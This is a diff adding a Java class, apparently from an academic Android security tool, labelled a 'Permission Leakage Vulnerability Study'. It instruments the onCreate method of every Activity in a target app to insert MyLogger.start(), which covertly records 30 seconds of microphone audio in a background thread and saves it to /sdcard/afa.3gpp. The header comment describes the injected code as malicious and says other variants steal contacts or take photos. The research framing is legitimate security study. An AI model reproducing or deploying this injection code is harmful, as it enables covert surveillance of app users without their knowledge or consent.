@@ -1,0 +1,88 @@
+package enl.sifa.ex;
+
+import java.io.IOException;
+
+import android.media.MediaRecorder;
+import android.util.Log;
+import enl.sifa.BytecodePosition;
+import enl.sifa.CP;
+import enl.sifa.CPFinder;
+import enl.sifa.CPInstrumenter;
+import enl.sifa.InstrumentOperation;
+import enl.sifa.InstrumentPosition;
+import enl.sifa.SIFARunnable;
+
+/***
+ * Script for Permission Leakage Vulnerability Study (PLVS). It inserts
+ * malicious code by hooking with the onCreate method of Activity. Depending on
+ * the intent, malicious code can: 0). read and send out user's contact list; 1).
+ * record audio continuously; 2). take photos continuously, all in background.
+ * 
+ * @author haos@enl.usc.edu
+ * 
+ */
+public class PLVS implements SIFARunnable {
+	public void run() {
+		CPFinder.init();
+		CPFinder.setClass(null, "android.app.Activity");
+		CPFinder.setMethod("onCreate:(Landroid/os/Bundle;)V");
+		CPFinder.setBytecode(BytecodePosition.ENTRY);
+
+		for (CP cp : CPFinder.apply()) {
+			String code = "MyLogger.start();";
+			CPInstrumenter.exec(cp, InstrumentOperation.INSERT, InstrumentPosition.BEFORE, code);
+		}
+	}
+}
+
+class MyLogger {
+	private static final String TAG = "MyLogger";
+	public static Boolean flag = false;
+
+	public static void start() {
+		synchronized (flag) {
+			if (flag) {
+				return;
+			} else {
+				flag = true;
+			}
+		}
+
+		new Thread() {
+			public void run() {
+				Log.v(TAG, "start recording: " + System.currentTimeMillis());
+				record_audio();
+				Log.v(TAG, "stop recording: " + System.currentTimeMillis());
+			}
+		}.start();
+	}
+
+	private static void record_audio() {
+		MediaRecorder recorder = new MediaRecorder();
+		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+		recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+		recorder.setOutputFile("/sdcard/afa.3gpp");
+
+		try {
+			recorder.prepare();
+		} catch (IllegalStateException e) {
+			e.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+
+		recorder.start(); // Recording is now started
+
+		try {
+			Thread.sleep(30000);
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}
+
+		recorder.stop();
+		recorder.reset(); // You can reuse the object by going back to setAudioSource() step
+		recorder.release(); // Now the object cannot be reused
+	}
+
+}
